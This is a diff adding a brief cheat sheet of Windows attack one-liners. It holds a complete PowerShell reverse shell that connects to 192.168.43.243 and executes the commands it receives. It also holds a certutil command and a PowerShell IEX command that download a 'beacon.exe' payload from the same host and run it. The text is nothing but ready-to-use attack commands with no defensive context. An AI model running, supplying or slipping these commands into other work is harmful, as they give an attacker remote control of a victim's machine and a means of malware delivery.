@@ -1,0 +1,6 @@
+Reverse shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.43.243',99);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+Download and execute
+certutil.exe -urlcache -split -f http://192.168.43.243:80/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.243:80/beacon.exe')
